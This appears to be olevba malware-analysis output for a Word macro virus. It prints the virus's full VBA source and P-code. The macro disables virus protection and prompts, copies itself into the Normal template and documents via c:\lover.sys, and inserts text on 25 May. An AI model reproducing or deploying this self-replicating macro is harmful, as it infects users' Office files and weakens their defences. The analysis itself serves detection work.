olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.de - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Dim temp
Options.VirusProtection = 0
CM64 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.ConfirmConversions = 0
Application.EnableCancelKey = 0
KL63 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.SaveNormalPrompt = 0
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set TQ94 = ActiveDocument.VBProject.VBComponents.Item(1)
OI83 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set TQ94 = NormalTemplate.VBProject.VBComponents.Item(1)
SC10 = True
End If
If SC10 = True Then
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\lover.sys"
TQ94.CodeModule.AddFromFile ("c:\lover.sys")
TQ94.CodeModule.deletelines 1, 4
TQ94.CodeModule.replaceline 1, "Sub AutoClose()"
ElseIf OI83 = True Then
TQ94.CodeModule.AddFromFile ("c:\lover.sys")
TQ94.CodeModule.deletelines 1, 4
End If
If Day(Now()) = 25 And Month(Now()) = 5 Then
    For temp = 1 To 50 Step 1
        ActiveDocument.Content.InsertAfter " Word97.Lover "
    Next temp
End If
RU85:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.de
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2707 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn temp
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CM64 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St KL63 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set TQ94 
' Line #11:
' 	LitVarSpecial (True)
' 	St OI83 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set TQ94 
' Line #15:
' 	LitVarSpecial (True)
' 	St SC10 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld SC10 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitStr 0x000C "c:\lover.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #19:
' 	LitStr 0x000C "c:\lover.sys"
' 	Paren 
' 	Ld TQ94 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld TQ94 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld TQ94 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #22:
' 	Ld OI83 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #23:
' 	LitStr 0x000C "c:\lover.sys"
' 	Paren 
' 	Ld TQ94 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld TQ94 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld temp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #28:
' 	LitStr 0x000E " Word97.Lover "
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #29:
' 	StartForVariable 
' 	Ld temp 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label RU85 
' Line #32:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

